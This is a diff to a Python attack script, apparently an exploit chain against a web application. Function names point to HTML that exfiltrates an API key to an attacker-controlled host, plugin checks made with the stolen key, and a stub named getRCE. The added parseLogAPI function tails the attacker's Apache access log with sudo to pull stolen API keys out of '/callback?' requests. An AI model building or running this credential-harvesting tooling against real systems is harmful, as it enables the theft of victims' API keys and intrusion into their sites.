@@ -10,13 +10,6 @@ import urllib.parse
 import os
 import subprocess
 
-def log(message):
-    """
-    Prints a string, message, to standard output.
-    """
-
-    pass
-
 def createAPIHTML(lhost):
     """
     Creates HTML for API key exfiltration, replacing the hardcoded IP with lhost.
@@ -79,6 +72,50 @@ def parseForKey(response):
         
         return None
     except json.JSONDecodeError:
+        return None
+
+def parseLogAPI():
+    """
+    Monitors the Apache access log for API key exfiltration callbacks,
+    parses them using parseForKey and prints any found keys.
+    
+    Returns:
+        str: The first discovered API key, or None if no key is found
+    """
+    try:
+        # Call tail on the Apache access log
+        process = subprocess.Popen(
+            ['sudo', 'tail', '/var/log/apache2/access.log'],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            universal_newlines=True
+        )
+        
+        # Read the output
+        stdout, stderr = process.communicate()
+        
+        if stderr:
+            print(f"[!] Error reading log file: {stderr}")
+            return None
+        
+        # Process each line
+        found_key = None
+        for line in stdout.splitlines():
+            # Check if the line contains callback
+            if '/callback?' in line:
+                key = parseForKey(line)
+                if key:
+                    print(f"[+] Found API key: {key}")
+                    if not found_key:
+                        found_key = key
+        
+        if not found_key:
+            print("[-] No API keys found in recent log entries")
+        
+        return found_key
+        
+    except Exception as e:
+        print(f"[!] Error in parseLogAPI: {str(e)}")
         return None
 
 def checkPlugins(url, apikey):
@@ -187,5 +224,3 @@ def getRCE(url):
     """
 
     pass
-
-startServer("127.0.0.1", 8888)
